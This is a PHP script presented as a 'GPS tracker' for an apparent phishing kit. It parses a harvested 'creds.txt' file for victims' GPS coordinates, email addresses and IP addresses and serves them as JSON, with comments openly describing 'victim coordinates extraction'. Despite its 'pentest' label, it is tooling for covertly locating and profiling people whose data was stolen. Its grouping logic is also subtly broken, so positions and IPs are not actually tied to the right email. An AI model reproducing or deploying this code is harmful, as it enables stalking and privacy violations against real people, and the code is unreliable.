<?php
// positions.php - MILITARY GPS TRACKER v2.0 (Ariens Pro Pentest)
// Real-time victim coordinates extraction + trajectories
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');

$credsFile = 'creds.txt';
if (!file_exists($credsFile)) file_put_contents($credsFile, '');
chmod($credsFile, 0666);

$creds = file_get_contents($credsFile);

// Extract ALL GPS positions with timestamps (exact format tolerance)
preg_match_all('/📍\s*GPS\s*POSITION\s*:\s*(-?\d+(?:\.\d+)?),\s*(-?\d+(?:\.\d+)?)(?:\s*\[(.*?)\])?/i', $creds, $gpsMatches, PREG_SET_ORDER);
preg_match_all('/📧\s*([^\s]+@[^\s]+)/i', $creds, $emailMatches, PREG_SET_ORDER);
preg_match_all('/IP\s*ADDRESS\s*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i', $creds, $ipMatches, PREG_SET_ORDER);

$allPositions = [];
foreach ($gpsMatches as $m) {
    $lat = (float)$m[1]; $lng = (float)$m[2];
    if (abs($lat) <= 90 && abs($lng) <= 180 && $lat != 0 && $lng != 0) {
        $time = isset($m[3]) ? trim($m[3]) : date('Y-m-d H:i:s');
        $allPositions[] = ['lat'=>$lat, 'lng'=>$lng, 'time'=>$time];
    }
}

usort($allPositions, fn($a,$b) => strtotime($b['time']) - strtotime($a['time']));

// Group by email (10 latest positions each)
$victims = [];
$emailList = array_unique(array_map(fn($m)=>trim($m[1]), $emailMatches[1] ?? []));
foreach ($emailList as $i => $email) {
    $positions = array_slice($allPositions, $i*10, 10);
    if (!empty($positions)) {
        $victims[] = [
            'id' => count($victims)+1,
            'email' => $email,
            'ip' => $ipMatches[1][0] ?? 'unknown',
            'latest' => $positions[0],
            'positions' => $positions,
            'count' => count($positions)
        ];
    }
}

echo json_encode($victims);
?>
